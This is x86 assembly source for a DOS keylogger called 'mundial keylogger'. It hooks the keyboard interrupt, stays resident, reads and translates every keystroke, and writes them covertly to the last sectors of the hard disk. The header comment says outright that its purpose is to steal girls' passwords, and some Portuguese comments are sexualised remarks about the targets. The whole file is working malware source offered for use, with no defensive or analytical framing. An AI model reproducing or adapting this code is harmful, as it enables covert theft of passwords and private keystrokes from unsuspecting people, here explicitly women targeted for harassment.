; mundial keylogger
; Copyright (c) 2015-2018, Bruno Guimarães Salvador. To H*J*CK girls passwords by hooking the Int 9 == IRQ 1 of their PCs
; All rights reserved.
org 100h
virus:
cli
push es
mov ax,0
mov es,ax
es
mov cx,[24h]
es
mov dx,[26h]
es
mov [180h],cx
es
mov [182h],dx
mov cx,0
int 12h
sub ax,3
mov cl,6
shl ax,cl
mov cx,0
mov bp,ax
es
mov [24h],cx
es
mov [26h],bp
pop es
sti
push	es
mov		si,bp
mov		es,si
mov		si,code 	;começo do program
mov		di,0
mov		cx,codesize-code	;02578h = tamanho do programa
repz
movsb
pop		es

push		es
mov		si,bp
mov		es,si
mov		si,keys 	;keystrokes
mov		di,codesize-code+1024
mov		cx,36h
repz
movsb
pop		es

push		es
mov		ax,bp
mov		es,ax
mov		ax,0
mov		bx,codesize
mov		es,bp
es
mov		[bx],ax
pop		es
ret
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;Aqui começa o programa que é o handler da interrupção do teclado
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
code:
pushf
pushaw ;db 60
sti

IN		AL,60H;************ A linha mais importante do meu programa:
;LÊ OS SCAN CODES DAS TECLAS PRESSIONADAS POR ANGELS DELICIAS

push		ax
int		60h
pop		ax
push		cs
pop		bx
push		ds
mov		ds,bx
push		es
test		al,80h
jnz		L1
ds
mov		bx,[codesize]
ds
lea		si,[codesize+2]
ds
mov		[si+bx],al
inc		bx
ds
mov		[codesize],bx
L1:
cmp		bx,512
jz		zera
jmp		pula
zera:
mov		ax,0
mov		[codesize],ax
pula:
push		es

mov		cx,ds	;Traduz os 512 bytes de scan codes para ascii
mov		es,cx
mov		cx,1
push		bx
dec		bx
ds
lea		si,[codesize+2+bx]
pop		bx
push		bx
ds
lea		bx,[keys-code]
xlating:
cmp		cx,0
jz		xlated
ds
mov		al,[si]
push		ds
push		cx
mov		cx,cs
mov		ds,cx
pop		cx
db		0D7h		;xlat scan codes to ascii
pop		ds
ds
mov		[si],al
inc		si
dec		cx
jmp		xlating
xlated:
pop		bx
pop		es

mov		ah,41h
mov		bx,55AAh
mov		dl,80h
INT		13h
jc		chs


int		12h
sub		ax,4
mov		cl,6
shl		ax,cl
mov		bp,ax
push		ds
mov		ds,bp
mov		si,0h
mov		ah,48h
mov		dl,80h
INT		13h


mov		si,100h
mov		al,10h
mov		[100h],al
mov		al,0
mov		[101h],al
mov		al,01
mov		[102h],al
xor		ax,ax
mov		[103h],al
cs
lea		ax,[codesize+2]
mov		[104h],ax
mov		ax,cs
mov		[106h],ax
mov		ax,[10h]
sub		ax,5
mov		[108h],ax
mov		ax,[12h]
mov		[10ah],ax
xor		ax,ax
mov		[10ch],ax
mov		[10eh],ax

mov		ah,43h
mov		dl,80h
INT		13H ;A SEGUNDA LINHA MAIS IMPORTANTE DO MEU PROGRAMA: GRAVA NO ULTIMO SETOR DO DISCO RIGIDO TUDO QUE FOR TECLADO
pop		ds
;mov		 ax,codesize
;mov		 [codesize],ax
jmp		skip

chs:
MOV		AH,8
MOV		DL,80h
MOV		DI,0
PUSH		ES
MOV		ES,DI
INT		13h
POP		ES

MOV		AH,3
MOV		AL,2
SUB		CL,2
PUSH		ES
MOV		BX,cs
MOV		ES,BX
MOV		BX,codesize+2
MOV		DL,80h
INT		13h ;A TERCEIRA LINHA MAIS IMPORTANTE DO MEU PROGRAMA: GRAVA NO ULTIMO SETOR DO DISCO RIGIDO TUDO QUE FOR TECLADO
POP		ES

skip:
mov		al,20h
out		20h,al
pop		es
pop		ds
popaw
popf
iret
keys db 0FCH,1BH,"1234567890-=",8,9,"qwertyuiop[]",0DH, 0FFH, "asdfghjkl;'",60H, 0FFH, "\zxcvbnm,./",0FFH, 2AH, 0FFH," \;<=>?",0
codesize:
buf db 1024 dup (0)